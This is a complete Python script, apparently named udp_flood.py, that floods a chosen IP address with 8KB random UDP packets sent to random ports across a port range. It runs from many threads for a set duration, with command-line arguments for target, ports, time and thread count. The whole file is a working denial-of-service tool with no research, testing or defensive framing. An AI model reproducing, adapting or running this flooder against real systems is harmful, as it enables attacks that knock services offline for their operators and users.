import socket
import threading
import random
import time
import sys

def udp_attack(target_ip, port_start, port_end, duration, thread_id):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(8192)  # 8KB payload
    end_time = time.time() + duration
    sent = 0
    while time.time() < end_time:
        try:
            port = random.randint(port_start, port_end)
            client.sendto(payload, (target_ip, port))
            sent += 1
            if sent % 1000 == 0:
                print(f"Thread {thread_id} sent {sent} packets...")
        except Exception as e:
            print(f"Thread {thread_id} error: {e}")
            break
    client.close()

def udp_flood(target_ip, port_start, port_end, duration, num_threads):
    print(f"Starting UDP flood: {target_ip},{port_start}-{port_end},{duration}s with {num_threads} threads...")
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=udp_attack, args=(target_ip, port_start, port_end, duration, i))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.01)
    time.sleep(duration)
    for t in threads:
        t.join(timeout=2)

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage: python udp_flood.py <target_ip> <port_start> <port_end> <duration_seconds> <threads>")
        sys.exit(1)
    udp_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]), int(sys.argv[5]))
